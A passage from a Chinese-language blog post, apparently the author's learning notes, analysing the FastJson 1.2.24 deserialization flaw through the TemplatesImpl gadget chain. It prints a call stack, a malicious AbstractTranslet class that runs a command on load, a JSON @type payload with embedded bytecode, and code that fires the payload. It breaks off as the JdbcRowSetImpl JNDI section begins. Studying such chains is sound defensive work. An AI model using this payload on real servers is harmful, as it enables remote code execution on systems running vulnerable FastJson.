</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(obj2);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>运行结果：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012144421136.png" alt="image-20221012144421136"  />
</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012144724722.png" alt="image-20221012144724722"  />
</p>
<p>总的来说，<code>parse(string)</code>,<code>parseObject(string,clazzs)</code>与<code>parseObject(string)</code>进行反序列化时的细节区别在于，<code>parse(string) </code>会识别并调用目标类的 <code>setter</code> 方法，而 <code>parseObject(string)</code> 由于要将返回值转化为<code>JSONObject</code>，多执行了<code> JSON.toJSON(obj)</code>，所以在处理过程中会调用反序列化目标类的<code>getter </code>方法来将参数赋值给<code>JSONObject</code>，所以反序列化过程中，<code>parseObject(string)</code>的危害性相对会更大。</p>
<h2 id="fastjson-1224分析"><code>FastJson 1.2.24</code>分析<a hidden class="anchor" aria-hidden="true" href="#fastjson-1224分析">#</a></h2>
<p><code>FastJson1.2.24</code>开启了FastJson反序列实现RCE的大门</p>
<p>fastjson 默认使用 <code>@type</code> 指定反序列化任意类，攻击者可以通过在 Java 常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的 getter/setter 方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。此漏洞开启了 fastjson 反序列化漏洞的大门，为安全研究人员提供了新的思路。</p>
<p>这里对<code>1.2.24</code>的两条常见利用链<code>TemplatesImpl 反序列化</code>和<code>JdbcRowSetImpl 反序列化</code>进行简单的学习。</p>
<h3 id="templatesimpl-反序列化"><code>TemplatesImpl</code> 反序列化<a hidden class="anchor" aria-hidden="true" href="#templatesimpl-反序列化">#</a></h3>
<p>分析一下漏洞利用链的全过程，实际上在查阅资料的同时，发现其也是<code>CommonsCollections-3</code>链子的分析，因为刚刚接触到<code>Java安全</code>,对<code>CC3链只是</code>略有耳闻，之后的学习之中会慢慢学习<code>CC</code>链的各种利用姿势。</p>
<p>参考的各位大师傅的博客关于<code>TemplateImpl</code>反序列化链的思考都是从漏洞挖掘的思路开始，从<code>getTransletInstance()</code>这个实例化点出发，需要哪一个利用元素就去寻找，最后完善利用过程。</p>
<p>函数栈调用情况:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>exec:348, Runtime (java.lang)
</span></span><span style="display:flex;"><span>&lt;clinit&gt;:22, Calculartor (com.reus09)
</span></span><span style="display:flex;"><span>newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>newInstance:423, Constructor (java.lang.reflect)
</span></span><span style="display:flex;"><span>newInstance:442, Class (java.lang)
</span></span><span style="display:flex;"><span>getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
</span></span><span style="display:flex;"><span>newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
</span></span><span style="display:flex;"><span>getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
</span></span><span style="display:flex;"><span>invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:62, NativeMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
</span></span><span style="display:flex;"><span>invoke:498, Method (java.lang.reflect)
</span></span><span style="display:flex;"><span>setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span style="display:flex;"><span>parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span style="display:flex;"><span>parse:137, JSON (com.alibaba.fastjson)
</span></span><span style="display:flex;"><span>parse:193, JSON (com.alibaba.fastjson)
</span></span><span style="display:flex;"><span>main:117, FastJsonTest (com.reus09)
</span></span></code></pre></td></tr></table>
</div>
</div><p>首先我们在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</code>存在一个成员属性 <code>_class</code>，是一个 Class 类型的数组，数组里下标为<code>_transletIndex</code> 的类会在 <code>getTransletInstance()</code> 方法中使用 <code>newInstance()</code> 实例化。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012163033006.png" alt="image-20221012163033006"  />
</p>
<p>同时我们发现<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</code>中调用了<code>getTransletInstance()</code></p>
<p>方法,同时,<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code>调用了这里的<code>newTransformer()</code>方法。<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012163356927.png" alt="image-20221012163356927"  />
</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012163504021.png" alt="image-20221012163504021"  />
</p>
<p>这里的<code>getOutputProperties()</code>方法就是对<code>TemplatesImpl</code>类的私有元素<code>outputProperties</code>的<code>getter</code>方法</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012163737803.png" alt="image-20221012163737803"  />
</p>
<p>那么我们只要控制<code>_class</code>以及<code>_transletIndex</code>就可以实现任意类的实例化，从而触发漏洞。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012164030137.png" alt="image-20221012164030137"  />
</p>
<p><code>defineTransletClasses()</code>与<code>newInstance()</code>在同一方法内，于是查看一下<code>defineTransletClasses()</code> 的逻辑。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012164449592.png" alt="image-20221012164449592"  />
</p>
<p>先要求 <code>_bytecodes</code> 不为空，接着就会调用自定义的 ClassLoader 去加载 <code>_bytecodes</code> 中的 <code>byte[]</code> 。而 <code>_bytecodes</code> 也是该类的成员属性。</p>
<p><code>_bytecodes</code>变量非空值时，程序将会把<code>_bytecodes</code>数组中的值循环取出，使用<code>loader.defineClass</code>方法从字节码转化为<code>Class</code>对象，随后后赋值给<code>_class[i]</code>。</p>
<p>而如果这个类的父类为 <code>ABSTRACT_TRANSLET</code> 也就是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，就会将类成员属性的，<code>_transletIndex</code> 设置为当前循环中的标记位，而如果是第一次调用，就是<code>_class[0]</code>。如果父类不是这个类，将会抛出异常。</p>
<p>那这样一条完整的漏洞调用链就呈现出来了：</p>
<ul>
<li>构造一个 TemplatesImpl 类的反序列化字符串，其中 <code>_bytecodes</code> 是我们构造的恶意类的类字节码，这个类的父类是 AbstractTranslet，最终这个类会被加载并使用 <code>newInstance()</code> 实例化。</li>
<li>在反序列化过程中，由于getter方法 <code>getOutputProperties()</code>，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：<code>getOutputProperties()</code> -&gt; <code>newTransformer()</code> -&gt; <code>getTransletInstance()</code> -&gt; <code>defineTransletClasses()</code> / <code>EvilClass.newInstance()</code>.</li>
</ul>
<p>同时为了程序在实例化之前因报错退出，需要将<code>_name</code>和<code>_tfactory</code>设置不为空，<code>_tfactory</code>如果不指定会出现空指针。查看_tfactory的定义如下：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">transient</span> TransformerFactoryImpl _tfactory = <span style="color:#fff;font-weight:bold">null</span>;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012165031307.png" alt=""  />
</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012165045973.png" alt="image-20221012165045973"  />
具体实现：</p>
<p>一个继承了<code>AbstractTranslet</code>的恶意类,将其编译成字节码。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName Calculartor
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2022/10/12 15:42
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> Calculartor <span style="color:#fff;font-weight:bold">extends</span> AbstractTranslet {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">static</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>            Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(<span style="color:#0ff;font-weight:bold">&#34;open /System/Applications/Calculator.app&#34;</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span> (IOException e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, SerializationHandler[] handlers) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>payload</code>部分：</p>
<ul>
<li>
<p><code>JSON</code>对应的如下:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_bytecodes&#34;</span>: [<span style="color:#0ff;font-weight:bold">&#34;yv66vgAAADQA...CJAAk=&#34;</span>],
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_tfactory&#34;</span>: {},
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_outputProperties&#34;</span>: {},
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>代码如下:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">byte</span>[] code = Files.<span style="color:#007f7f">readAllBytes</span>(Paths.<span style="color:#007f7f">get</span>(<span style="color:#0ff;font-weight:bold">&#34;/Users/reus09/Desktop/rce/FastJson/target/classes/com/reus09/Calculartor.class&#34;</span>));
</span></span><span style="display:flex;"><span>String codeString = Base64.<span style="color:#007f7f">getEncoder</span>().<span style="color:#007f7f">encodeToString</span>(code);
</span></span><span style="display:flex;"><span>String payload = <span style="color:#0ff;font-weight:bold">&#34;{\&#34;@type\&#34;:\&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;,\&#34;_bytecodes\&#34;:[\&#34;&#34;</span>+Base64.<span style="color:#007f7f">getEncoder</span>().<span style="color:#007f7f">encodeToString</span>(code)+<span style="color:#0ff;font-weight:bold">&#34;\&#34;],\&#34;_name\&#34;:\&#34;reus09\&#34;,\&#34;_tfactory\&#34;:{ },\&#34;_outputProperties\&#34;:{ },\&#34;_version\&#34;:\&#34;1.0\&#34;,\&#34;allowedProtocols\&#34;:\&#34;all\&#34;}&#34;</span>;
</span></span><span style="display:flex;"><span>JSON.<span style="color:#007f7f">parse</span>(payload, Feature.<span style="color:#007f7f">SupportNonPublicField</span>);
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012165442664.png" alt="image-20221012165442664"  />
</p>
</li>
</ul>
<h3 id="jdbcrowsetimpl--反序列化"><code>JdbcRowSetImpl </code> 反序列化<a hidden class="anchor" aria-hidden="true" href="#jdbcrowsetimpl--反序列化">#</a></h3>
<p><code>JdbcRowSetImpl </code>类位于 <code>com.sun.rowset.JdbcRowSetImpl</code> ，是 <code>javax.naming.InitialContext#lookup()</code> 参数可控导致的 JNDI 注入。</p>
<p><code>JdbcRowSetImpl</code>调用函数栈</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
